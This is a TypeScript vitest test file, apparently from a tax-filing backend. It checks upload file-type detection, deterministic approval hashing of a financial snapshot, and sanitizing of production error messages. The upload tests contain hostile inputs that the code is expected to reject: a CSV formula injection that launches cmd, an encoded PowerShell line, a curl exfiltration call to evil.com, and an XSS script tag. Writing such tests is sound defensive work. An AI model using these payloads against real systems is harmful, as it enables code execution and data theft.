import { describe, it, expect, vi } from 'vitest';
import { detectMimeTypeFromBuffer } from '../middlewares/upload';
import { generateApprovalHash, canonicalJsonStringify, CanonicalFinancialSnapshot } from '../utils/helpers';
import { errorHandler, AppError } from '../utils/response';

describe('Security & Data Integrity Audit Tests', () => {
  describe('Priority 1: Document Upload & Magic Byte Validation', () => {
    it('detects authentic PDF magic bytes (%PDF-)', () => {
      const pdfBuffer = Buffer.from('%PDF-1.7 standard header');
      expect(detectMimeTypeFromBuffer(pdfBuffer)).toBe('application/pdf');
    });

    it('detects authentic PNG magic bytes', () => {
      const pngBuffer = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
      expect(detectMimeTypeFromBuffer(pngBuffer)).toBe('image/png');
    });

    it('detects authentic JPEG magic bytes', () => {
      const jpegBuffer = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]);
      expect(detectMimeTypeFromBuffer(jpegBuffer)).toBe('image/jpeg');
    });

    it('detects authentic XLSX (PK ZIP) magic bytes', () => {
      const zipBuffer = Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00]);
      expect(detectMimeTypeFromBuffer(zipBuffer)).toBe('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
    });

    it('accepts authentic clean CSV / plain text', () => {
      const csvBuffer = Buffer.from('Date,Description,Amount,TDS\n2025-01-01,Salary,50000,5000');
      expect(detectMimeTypeFromBuffer(csvBuffer)).toBe('text/csv');
    });

    it('rejects executable disguised as PDF (MZ header)', () => {
      // Starts with MZ (Windows PE executable) followed by fake %PDF
      const fakeBuffer = Buffer.from('MZ\x90\x00%PDF-1.7');
      expect(detectMimeTypeFromBuffer(fakeBuffer)).toBeNull();
    });

    it('rejects ELF binary executable header', () => {
      const elfBuffer = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01]);
      expect(detectMimeTypeFromBuffer(elfBuffer)).toBeNull();
    });

    it('rejects binary data containing null bytes disguised as CSV', () => {
      const binaryDisguised = Buffer.from('col1,col2\x00\x01\x02malicious_binary');
      expect(detectMimeTypeFromBuffer(binaryDisguised)).toBeNull();
    });

    it('rejects HTML/Script payload disguised as CSV', () => {
      const htmlPayload = Buffer.from('<html><script>alert(1)</script></html>');
      expect(detectMimeTypeFromBuffer(htmlPayload)).toBeNull();

      const docTypePayload = Buffer.from('<!DOCTYPE html><html><body>Test</body></html>');
      expect(detectMimeTypeFromBuffer(docTypePayload)).toBeNull();
    });

    it('rejects CSV formula injection payloads (DDE/CMD execution)', () => {
      const ddePayload = Buffer.from('Name,Amount\n=cmd|\'/C calc\'!A0,1000');
      expect(detectMimeTypeFromBuffer(ddePayload)).toBeNull();

      const powershellPayload = Buffer.from('Field1,Field2\n@powershell -enc aW52b2tl,2000');
      expect(detectMimeTypeFromBuffer(powershellPayload)).toBeNull();

      const curlPayload = Buffer.from('Field1\n-curl http://evil.com/exfil');
      expect(detectMimeTypeFromBuffer(curlPayload)).toBeNull();
    });
  });

  describe('Priority 3: Approval Integrity & Canonical Financial Snapshot Hash', () => {
    const baseSnapshot: CanonicalFinancialSnapshot = {
      taxReturnId: 'tr-uuid-1',
      userId: 'user-uuid-1',
      assessmentYear: '2025-26',
      regime: 'NEW',
      ruleVersion: 'AY2025-26-v1',
      grossIncome: 1200000,
      totalDeductions: 75000,
      taxableIncome: 1125000,
      taxLiability: 78750,
      totalTax: 81900,
      tdsDeducted: 50000,
      refundPayable: 31900,
      calculationId: 'calc-uuid-1',
      timestamp: '2026-10-11T12:00:00.000Z',
    };

    it('generates deterministic SHA-256 hash regardless of object key order', () => {
      const shuffledSnapshot: any = {
        timestamp: baseSnapshot.timestamp,
        calculationId: baseSnapshot.calculationId,
        refundPayable: baseSnapshot.refundPayable,
        tdsDeducted: baseSnapshot.tdsDeducted,
        totalTax: baseSnapshot.totalTax,
        taxLiability: baseSnapshot.taxLiability,
        taxableIncome: baseSnapshot.taxableIncome,
        totalDeductions: baseSnapshot.totalDeductions,
        grossIncome: baseSnapshot.grossIncome,
        ruleVersion: baseSnapshot.ruleVersion,
        regime: baseSnapshot.regime,
        assessmentYear: baseSnapshot.assessmentYear,
        userId: baseSnapshot.userId,
        taxReturnId: baseSnapshot.taxReturnId,
      };

      const hash1 = generateApprovalHash(baseSnapshot);
      const hash2 = generateApprovalHash(shuffledSnapshot);
      expect(hash1).toBe(hash2);
      expect(hash1).toHaveLength(64); // 256 bits = 64 hex chars
    });

    it('changes approval hash when financial figures are modified', () => {
      const originalHash = generateApprovalHash(baseSnapshot);

      const modifiedIncomeSnapshot: CanonicalFinancialSnapshot = {
        ...baseSnapshot,
        grossIncome: 1200001, // 1 rupee difference
      };
      const modifiedIncomeHash = generateApprovalHash(modifiedIncomeSnapshot);
      expect(modifiedIncomeHash).not.toBe(originalHash);

      const modifiedTaxSnapshot: CanonicalFinancialSnapshot = {
        ...baseSnapshot,
        totalTax: 80000,
      };
      const modifiedTaxHash = generateApprovalHash(modifiedTaxSnapshot);
      expect(modifiedTaxHash).not.toBe(originalHash);

      const modifiedRegimeSnapshot: CanonicalFinancialSnapshot = {
        ...baseSnapshot,
        regime: 'OLD',
      };
      const modifiedRegimeHash = generateApprovalHash(modifiedRegimeSnapshot);
      expect(modifiedRegimeHash).not.toBe(originalHash);
    });

    it('canonicalJsonStringify produces alphabetically ordered keys', () => {
      const obj = { z: 1, a: 2, m: 3 };
      const canonical = canonicalJsonStringify(obj);
      expect(canonical).toBe('{"a":2,"m":3,"z":1}');
    });

    it('supports legacy 3-parameter signature for backwards compatibility', () => {
      const legacyHash = generateApprovalHash('ret-1', 'user-1', '2026-10-11T00:00:00Z');
      expect(legacyHash).toHaveLength(64);
      expect(typeof legacyHash).toBe('string');
    });
  });

  describe('Error Response Sanitization', () => {
    it('masks internal server error messages and details in production', () => {
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';

      const mockRes: any = {
        statusCode: 0,
        data: null,
        status(code: number) {
          this.statusCode = code;
          return this;
        },
        json(body: any) {
          this.data = body;
          return this;
        },
      };

      const internalErr = new AppError('Raw SQL syntax error at table public.users', 500, 'DB_ERROR', ['table=users']);
      errorHandler(internalErr, {} as any, mockRes, () => {});

      expect(mockRes.statusCode).toBe(500);
      expect(mockRes.data.error.message).toBe('An unexpected internal error occurred');
      expect(mockRes.data.error.details).toEqual([]);

      process.env.NODE_ENV = originalEnv;
    });

    it('preserves client-facing 4xx error messages in production', () => {
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';

      const mockRes: any = {
        statusCode: 0,
        data: null,
        status(code: number) {
          this.statusCode = code;
          return this;
        },
        json(body: any) {
          this.data = body;
          return this;
        },
      };

      const clientErr = new AppError('File type application/x-dosexec is not allowed', 400, 'INVALID_FILE_TYPE');
      errorHandler(clientErr, {} as any, mockRes, () => {});

      expect(mockRes.statusCode).toBe(400);
      expect(mockRes.data.error.message).toBe('File type application/x-dosexec is not allowed');
      expect(mockRes.data.error.code).toBe('INVALID_FILE_TYPE');

      process.env.NODE_ENV = originalEnv;
    });
  });
});
